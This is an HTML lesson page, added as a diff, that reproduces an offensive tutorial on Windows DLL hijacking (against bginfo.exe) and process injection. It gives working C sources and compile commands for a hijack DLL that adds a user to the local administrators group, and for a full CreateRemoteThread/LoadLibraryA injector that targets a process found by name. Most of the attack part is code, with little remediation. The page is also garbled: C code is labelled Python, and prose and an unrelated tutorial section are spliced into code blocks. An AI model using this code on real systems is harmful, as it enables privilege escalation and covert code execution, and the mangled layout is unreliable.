@@ -1,0 +1,372 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DLL hijacking in Windows. Simple C example.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #3</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">DLL hijacking in Windows. Simple C example.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">What is DLL hijacking? DLL hijacking is technique when we tricking a legitimate/trusted application into loading an our malicious DLL. In Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly. Here is a diagram showing the default DLL search order in Windows:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In our post, we will only consider the simplest case: the directory of an application is writable. In this case, any DLL loaded by the application can be hijacked because it’s the first location used in the search process.</p>
+
+            <div id="step-1-find-process-with-missing-dlls" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Step 1. Find process with missing DLLs</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following filters:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">which will identify if there is any DLL that the application tries to load and the actual path that the application is looking for the missing DLL:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In our example, the process Bginfo.exe is missing several DLLs which possibly can be used for DLL hijacking. For example Riched32.dll</p>
+
+            <div id="step-2-check-folder-permissions" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Step 2. Check folder permissions</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to check folder permissions: icacls C:\Users\user\Desktop\</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">According to the documentation we have write access to this folder.</p>
+
+            <div id="step-3-dll-hijacking" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Step 3. DLL hijacking</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Firstly, let’s go to run our bginfo.exe:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Therefore if I plant a DLL called Riched32.dll in the same directory as bginfo.exe when that tool executes so will my malicious code. For simplicity, I create DLL which just pop-up a message box:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+DLL hijacking example
+author: @cocomelonc
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD ul_reason_for_call, LPVOID lpReserved) {
+switch (ul_reason_for_call) {
+case DLL_PROCESS_ATTACH:
+MessageBox(
+NULL,
+"Meow-meow!",
+"=^..^=",
+MB_OK
+);
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+
+return TRUE;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Now we can compile it (on attacker’s machine):</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then rename as Riched32.dll and copy to C:\Users\user\Desktop\ my malicious DLL.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And now launch bginfo.exe:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, our malicious logic is executed: So, bginfo.exe and malicious Riched32.dll in the same folder (1) Then launch bginfo.exe (2) Message box is popped-up! (3) Remediation Perhaps the simplest remediation steps would be simply to ensure that all installed software goes into the protected directory C:\Program Files or C:\Program Files (x86). If software cannot be installed into these locations then the next easiest thing is to ensure that only Administrative users have “create” or “write” permissions to the installation directory to prevent an attacker from deploying a malicious DLL and thereby breaking the exploitation. Privilege escalation DLL hijacking can be used for more than just executing code. It can also be used to gain persistence and privilege escalation: Find a process that runs/will run as with other privileges (horizontal/lateral movement) that is missing a dll. Have write permission on any folder where the dll is going to be searched (probably the executable directory or some folder inside the system path). Then replace our code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+DLL hijacking example
+author: @cocomelonc
+*/
+#include &lt;windows.h&gt;
+BOOL APIENTRY DllMain(HMODULE hModule,
+
+DWORD ul_reason_for_call, LPVOID lpReserved) {
+switch (ul_reason_for_call) {
+case DLL_PROCESS_ATTACH:
+system("cmd.exe /k net localgroup administrators user /add");
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}
+For x64 compile with: x86_64-w64-mingw32-gcc evil.c -shared -o target.dll
+For x86 compile with: i686-w64-mingw32-gcc evil.c -shared -o target.dll
+Further, all steps are similar.
+Conclusion
+But in all cases, there is a caveat.
+Note that in some cases the DLL you compile must export multiple functions to be
+loaded by the victim process. If these functions do not exist, the binary will not be able
+to load them and the exploit will fail.
+So, compiling custom versions of existing DLLs is more challenging than it may sound,
+as a lot of executables will not load such DLLs if procedures or entry points are missing.
+Tools such as DLL Export Viewer can be used to enumerate all external function names
+and ordinals of the legitimate DLLs. Ensuring that our compiled DLL follows the same
+format will maximise the chances of it being loaded successfully.
+In the future I will try to figure out this, and I will try create python script which create
+.def file from target original DLL.
+Process Monitor
+icacls
+DLL Export Viewer
+Module-Definition (def) files
+Source code in Github
+I’ve added the vulnerable bginfo (version 4.16) to github if you’d like to experiment.
+
+7. find process ID by name and inject to it. Simple C++ example.
+
+
+When I was writing my injector, I wondered how, for example, to find processes by
+name?
+When writing code or DLL injectors, it would be nice to find, for example, all processes
+running in the system and try to inject into the process launched by the administrator.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In this section I will try to solve a simplest problem first: find a process ID by name. Fortunately, we have some cool functions in the Win32 API. Let’s go to code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+simple process find logic
+author: @cocomelonc
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;tlhelp32.h&gt;
+// find process ID by process name
+int findMyProc(const char *procname) {
+HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+int pid = 0;
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+break;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+int main(int argc, char* argv[]) {
+int pid = 0; // process ID
+pid = findMyProc(argv[1]);
+if (pid) {
+printf("PID = %d\n", pid);
+}
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to examine our code. So first we parse process name from arguments. Then we find process ID by name and print it:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">To find PID we call findMyProc function which basically, what it does, it takes the name of the process we want to inject to and try to find it in a memory of the operating system, and if it exists, it’s running, this function return a process ID of that process:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">I added comments to the code, so I think you shouldn’t have so many questions. First we get a snapshot of currently executing processes in the system using CreateToolhelp32Snapshot:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And then we walks through the list recorded in the snapshot using Process32First and Process32Next:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">if we find the process which is match by name with our procname return it’s ID. As I wrote earlier, for simplicity, we just print this PID. Let’s go to compile our code: i686-w64-mingw32-g++ hack.cpp -o hack.exe \ -lws2_32 -s -ffunction-sections -fdata-sections \ -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And now launch it in Windows machine (Windows 7 x64 in my case): .\hack.exe mspaint.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything work perfectly. Now, if we think like a red teamer, we can write a more interesting injector, which, for example, find process by name and inject our payload to it. Let’s go! Again for simplicity I’ll take my injector from one of my posts and just add the function findMyProc:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+simple process find logic
+author: @cocomelonc
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;tlhelp32.h&gt;
+char evilDLL[] = "C:\\evil.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+// find process ID by process name
+int findMyProc(const char *procname) {
+HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+int pid = 0;
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+break;
+
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+int main(int argc, char* argv[]) {
+int pid = 0; // process ID
+HANDLE ph; // process handle
+HANDLE rt; // remote thread
+LPVOID rb; // remote buffer
+// handle to kernel32 and pass it to GetProcAddress
+HMODULE hKernel32 = GetModuleHandle("Kernel32");
+VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+// get process ID by name
+pid = findMyProc(argv[1]);
+if (pid == 0) {
+printf("PID not found :( exiting...\n");
+return -1;
+} else {
+printf("PID = %d\n", pid);
+}
+// open process
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL,
+evilLen,
+(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+// "copy" evil DLL between processes
+WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+// our process start new thread
+rt = CreateRemoteThread(ph,
+NULL,
+0, (LPTHREAD_START_ROUTINE)lb,
+rb, 0, NULL);
+CloseHandle(ph);
+return 0;
+
+}
+compile our hack2.cpp:</code></pre>
+            </div>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -O2 hack2.cpp -o hack2.exe</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">-mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">“Evil” DLL is the same:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+evil.cpp
+simple DLL for DLL inject to process
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/09/20/malware-injection-2.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD nReason, LPVOID lpReserved) {
+switch (nReason) {
+case DLL_PROCESS_ATTACH:
+MessageBox(
+NULL,
+"Meow from evil.dll!",
+"=^..^=",
+MB_OK
+);
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+
+}
+compile and put it in a directory of our choice:
+x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive
+
+run:
+.\hack2.exe mspaint.exe
+
+As you can see, everything is good: We launch mspaint.exe and our simple injector
+find PID (1)
+Our DLL with simple pop-up (Meow) is work! (2)
+To verify our DLL is indeed injected into mspaint.exe process we can use Process</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Hacker, in memory section we can see:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">It seems our simple injection logic worked! In this case, I didn’t check if SeDebugPrivilege is “enabled” in my own process. And how can I get this privileges??? I have to study this with all the caveats in the future.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">CreateToolhelp32Snapshot Process32First Process32Next strcmp Taking a Snapchot and Viewing Processes CloseHandle <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">OpenProcess</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibraryA</code> Source code on Github</p></main></body></html>
